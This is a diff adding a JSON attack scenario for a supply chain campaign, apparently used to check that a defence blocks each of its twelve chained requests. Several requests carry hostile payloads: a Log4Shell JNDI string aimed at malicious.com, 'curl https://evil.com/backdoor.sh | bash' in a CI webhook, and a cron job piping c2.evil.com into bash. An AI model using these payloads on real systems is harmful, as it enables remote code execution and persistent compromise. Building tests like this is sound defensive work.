@@ -1,0 +1,294 @@
+{
+  "id": "supply-chain-poisoning-campaign",
+  "name": "Supply Chain Poisoning Campaign",
+  "category": "Supply Chain Attacks",
+  "difficulty": "Expert",
+  "description": "Advanced supply chain attack exploiting vulnerable components, dependency confusion, package repositories, CDN poisoning, and software integrity failures (OWASP A06/A08)",
+  "tags": [
+    "owasp-a06",
+    "owasp-a08",
+    "supply-chain",
+    "dependency-confusion",
+    "cdn-poisoning",
+    "integrity-bypass"
+  ],
+  "steps": [
+    {
+      "id": "supply-recon-1",
+      "name": "Dependency Discovery and Enumeration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/package.json",
+        "headers": {
+          "User-Agent": "npm/8.19.0 node/v18.16.0 linux x64 workspaces/false",
+          "Accept": "application/vnd.npm.install-v1+json; q=1.0, application/json; q=0.8, */*"
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      }
+    },
+    {
+      "id": "supply-recon-2",
+      "name": "Component Version Scanning",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/.well-known/npm-package-listing",
+        "headers": {
+          "User-Agent": "Dependabot/1.0 (GitHub)",
+          "Accept": "application/json, text/plain"
+        }
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "dependsOn": [
+        "supply-recon-1"
+      ]
+    },
+    {
+      "id": "supply-cdn-probe-1",
+      "name": "CDN Integrity Bypass Probe",
+      "stage": "delivery",
+      "request": {
+        "method": "GET",
+        "url": "/assets/lib/jquery-3.6.0.min.js",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "*/*",
+          "Cache-Control": "no-cache",
+          "X-Integrity-Bypass": "sha384-invalid-hash-here"
+        }
+      },
+      "execution": {
+        "delayMs": 1600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-recon-2"
+      ]
+    },
+    {
+      "id": "supply-dependency-confusion-1",
+      "name": "Dependency Confusion Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/package/install",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "npm/9.6.7 node/v18.17.0"
+        },
+        "body": "{\"package\": \"@company/internal-utils\", \"version\": \"999.999.999\", \"registry\": \"https://registry.npmjs.org\", \"bypass_private_registry\": true}"
+      },
+      "execution": {
+        "delayMs": 2400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-cdn-probe-1"
+      ]
+    },
+    {
+      "id": "supply-vulnerable-component-1",
+      "name": "Vulnerable Component Exploitation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/parse",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"library\": \"log4j\", \"version\": \"2.14.1\", \"payload\": \"${jndi:ldap://malicious.com:1389/Exploit}\", \"exploit_cve\": \"CVE-2021-44228\"}"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-dependency-confusion-1"
+      ]
+    },
+    {
+      "id": "supply-package-typosquatting-1",
+      "name": "Package Typosquatting Attack",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/install-package",
+        "headers": {
+          "User-Agent": "pip/23.1.2 (python 3.11.4)"
+        },
+        "params": {
+          "name": "reqeusts",
+          "version": "latest",
+          "source": "pypi"
+        }
+      },
+      "execution": {
+        "delayMs": 2800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-vulnerable-component-1"
+      ]
+    },
+    {
+      "id": "supply-integrity-bypass-1",
+      "name": "Software Integrity Verification Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/upload/binary",
+        "headers": {
+          "Content-Type": "application/octet-stream",
+          "X-Checksum": "d41d8cd98f00b204e9800998ecf8427e",
+          "X-Signature": "MEQCIG7VbWV8ZElGZ5fQJxOgO1V7+QHyPt/pZj7QK7z1x0u0AiBdz2fH8q9LpZeJhXz5tV6t9fQ7e3yE8i6YzGt5H8m9vA==",
+          "X-Bypass-Integrity": "true"
+        },
+        "body": "MALICIOUS_BINARY_PAYLOAD_HERE"
+      },
+      "execution": {
+        "delayMs": 3600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-package-typosquatting-1"
+      ]
+    },
+    {
+      "id": "supply-repository-poison-1",
+      "name": "Package Repository Poisoning",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/registry/publish",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer npm_hijacked_token_abc123"
+        },
+        "body": "{\"name\": \"popular-package\", \"version\": \"1.0.1-security-patch\", \"malicious_code\": \"eval(atob('Y29uc29sZS5sb2coJ3BhY2thZ2UgaGlqYWNrZWQnKQ=='))\", \"backdoor\": true}"
+      },
+      "execution": {
+        "delayMs": 4200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-integrity-bypass-1"
+      ]
+    },
+    {
+      "id": "supply-cdn-hijack-1",
+      "name": "CDN Resource Hijacking",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/cdn-api/purge-cache",
+        "headers": {
+          "User-Agent": "CDN-Management-Tool/2.1",
+          "Authorization": "Bearer compromised_cdn_token"
+        },
+        "params": {
+          "url": "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js",
+          "replace_with": "https://malicious.com/jquery-backdoored.js"
+        }
+      },
+      "execution": {
+        "delayMs": 4800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-repository-poison-1"
+      ]
+    },
+    {
+      "id": "supply-build-process-1",
+      "name": "Build Process Compromise",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/ci/webhook",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-GitHub-Event": "push",
+          "X-Hub-Signature-256": "sha256=compromised_signature"
+        },
+        "body": "{\"repository\": {\"name\": \"production-app\"}, \"head_commit\": {\"message\": \"Security patch\"}, \"malicious_build_step\": \"curl https://evil.com/backdoor.sh | bash\"}"
+      },
+      "execution": {
+        "delayMs": 5400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-cdn-hijack-1"
+      ]
+    },
+    {
+      "id": "supply-update-hijack-1",
+      "name": "Software Update Hijacking",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/updates/check",
+        "headers": {
+          "User-Agent": "Application-Updater/1.0",
+          "X-Update-Server": "https://updates.evil.com",
+          "X-Force-Update": "true"
+        },
+        "params": {
+          "version": "1.0.0",
+          "channel": "stable"
+        }
+      },
+      "execution": {
+        "delayMs": 6000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-build-process-1"
+      ]
+    },
+    {
+      "id": "supply-persist-1",
+      "name": "Supply Chain Persistence Mechanism",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/package/configure",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"package\": \"system-monitor\", \"post_install_script\": \"#!/bin/bash\\ncrontab -l > /tmp/cron.bak\\necho '0 */6 * * * curl https://c2.evil.com/update | bash' >> /tmp/cron.bak\\ncrontab /tmp/cron.bak\", \"auto_update\": true}"
+      },
+      "execution": {
+        "delayMs": 6600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "supply-update-hijack-1"
+      ]
+    }
+  ]
+}
